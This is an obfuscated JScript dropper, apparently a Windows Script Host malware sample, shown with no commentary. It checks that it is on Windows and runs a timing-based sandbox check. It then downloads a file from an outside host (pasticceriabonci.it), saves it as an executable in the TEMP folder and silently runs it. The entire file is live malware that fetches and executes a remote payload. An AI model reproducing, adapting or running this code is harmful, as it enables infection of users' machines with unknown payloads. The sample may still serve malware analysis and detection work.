var w0 = false;
var i = "CreateObject";
var cd = function pe() {return WScript[i]("WScript.Shell");}(), YU = 11;
var f = "MSXML2.XMLHTTP";
var h = 2123213;
var qj = 0;
function ll(W){cd["Run"](W, qj, qj);};
function e(){return "" + f;};
function mv(Qf, qS){qj = qj * 1; return Qf - qS;};
function NO(){return i;};
/*@cc_on
  @if (@_win32 || @_win64)
    w0 = true;
  @end
@*/
if (w0)
{
var Br = "";
function Ox(){return 22;};
var J = 0; var U = 0;
function a0()
{
var v = new this["Date"]();
var G = v["getUTCMilliseconds"]();
WScript["Sleep"](Ox());
var v = new this["Date"]();
var w = v["getUTCMilliseconds"]();
WScript["Sleep"](Ox());
var v = new this["Date"]();
var R = v["getUTCMilliseconds"]();
var J = "wQ";
J = mv(w, G);
var U = "H";
U = mv(R, w);
Br = "open";
return mv(J, U);
}
var o = false;
var IK = false;
for (var hR = qj; hR < Ox() * 1; hR++){if (a0() != qj){
o = true; 
U = "31" + 11 * J + U; 
IK = true; 
break;
}}
function rG() {return ((o == true) && (o == IK)) ? 1 : qj;};
if (o && rG() && IK){
function Le() {return cd["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "Qvjig8Y9OK.exe";};
 k = e();
 sC = WScript[i](k);
 var fv0 = 1;
 while (fv0){
try {
sC[Br]("GET", "http://pasticceriabonci.it/m1psa", false);
sC["send"]();
E = "Sleep";
for (;;){WScript[E](Ox() * 11); if (sC["readystate"] >= 2 * 2) break;};
fv0 = qj;
} catch(l){};
}
function a(SI) {var a1 = (1, 2, 3, 4, 5, SI); return a1;};
pz = WScript[NO()]("ADODB.Stream");
k = pz;
k[Br]();
k["type"] = a(1);
k["write"](sC["ResponseBody"]);
pz["position"] = a(qj);
k["Save" + "ToFile"](Le(), 2);
pz["c"+"lose"]();
fv = Le();
ll(fv);
}
}

